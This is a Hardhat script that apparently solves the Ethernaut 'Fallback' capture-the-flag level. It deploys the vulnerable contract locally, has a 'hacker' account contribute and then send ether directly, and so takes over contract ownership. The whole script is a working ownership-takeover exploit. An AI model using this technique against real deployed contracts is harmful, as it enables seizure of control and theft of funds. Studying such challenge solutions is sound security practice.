const hre = require("hardhat");

async function main() {

  const Fallback = await hre.ethers.getContractFactory("Fallback");
  const fallback = await Fallback.deploy();
  await fallback.deployed();

  const [owner, hacker] = await ethers.getSigners();
  fallback.connect(hacker).contribute({value: ethers.utils.parseUnits("0.0001", "ether")});
  console.log(`Old owner: ${await fallback.owner()}`);

  await hacker.sendTransaction({
    to: fallback.address, 
    value: ethers.utils.parseUnits("0.0001", "ether")
  });
    
  console.log(`New owner: ${await fallback.owner()}`);

  console.log(`Fallback deployed to ${fallback.address}`);
 
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});




